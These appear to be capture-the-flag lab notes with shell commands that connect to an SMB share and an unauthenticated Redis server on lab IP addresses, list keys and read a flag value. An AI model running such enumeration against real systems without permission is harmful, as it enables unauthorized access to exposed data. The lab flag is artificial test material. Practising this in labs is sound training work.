```sh
smbclient \\\\10.129.154.131\\WorkShares
```

```sh
redis-cli -h <hostname>
redis-cli -h 10.129.206.34 info
redis-cli -h 10.129.206.34 SELECT 2
redis-cli -h 10.129.206.34
```

```sh
10.129.206.34:6379> keys *  
1) "flag"  
2) "temp"  
3) "stor"  
4) "numb"  
10.129.206.34:6379>
10.129.206.34:6379> get flag  
"03e1d2b376c37ab3f5319922053953eb"  
(0.56s)
```